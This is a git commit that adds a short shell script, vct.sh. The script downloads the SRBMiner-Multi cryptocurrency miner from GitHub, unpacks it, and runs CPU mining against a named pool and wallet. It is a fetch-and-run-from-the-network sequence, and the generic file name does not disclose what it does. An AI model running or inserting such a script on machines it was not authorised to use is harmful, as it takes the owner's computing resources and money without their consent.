26fb4acd9072c704a8e7b7a6a0ff45e95dbf52a7
maskosim27 <58825626+maskosim27@users.noreply.github.com>
2021-06-03 21:11:33 +0700

    Create vct.sh

---
+++ vct.sh
@@ -0,0 +1,4 @@
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner-Multi-0-7-6-Linux.tar.xz
+tar -xvf SRBMiner-Multi-0-7-6-Linux.tar.xz
+cd SRBMiner-Multi-0-7-6
+./SRBMiner-MULTI --disable-gpu --algorithm randomhash2 --pool fastpool.xyz:3338 --wallet 424050-35.01ed11e54e8f449f917e6dbc5fe3596a
